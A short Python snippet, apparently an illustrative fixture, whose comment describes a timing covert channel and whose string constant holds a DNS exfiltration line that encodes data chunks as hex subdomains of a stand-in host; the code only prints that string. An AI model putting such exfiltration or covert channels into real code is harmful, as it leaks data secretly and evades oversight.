# A covert channel might call time.sleep(0.4 if bit == "1" else 0.1) per bit.
DOC = 'socket.gethostbyname(f"{chunk.hex()}.exfil.example.net")'


def show():
    print(DOC)
